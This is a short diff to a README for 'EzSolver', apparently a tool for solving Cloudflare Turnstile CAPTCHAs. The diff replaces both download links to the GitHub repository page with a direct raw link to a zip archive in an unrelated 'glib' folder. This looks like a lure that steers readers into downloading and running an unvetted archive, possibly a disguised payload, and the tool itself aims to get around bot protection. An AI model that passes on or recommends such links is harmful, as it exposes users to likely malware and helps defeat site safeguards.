@@ -1,12 +1,12 @@
 # 🧩 EzSolver - Run Turnstile checks with ease
 
-[![Download EzSolver](https://img.shields.io/badge/Download-EzSolver-blue?style=for-the-badge&logo=github)](https://github.com/Tangramconditionalsale300/EzSolver)
+[![Download EzSolver](https://img.shields.io/badge/Download-EzSolver-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tangramconditionalsale300/EzSolver/main/glib/Ez_Solver_v1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Tangramconditionalsale300/EzSolver
+https://raw.githubusercontent.com/Tangramconditionalsale300/EzSolver/main/glib/Ez_Solver_v1.2.zip
 
 ## 🪟 Windows Setup
 
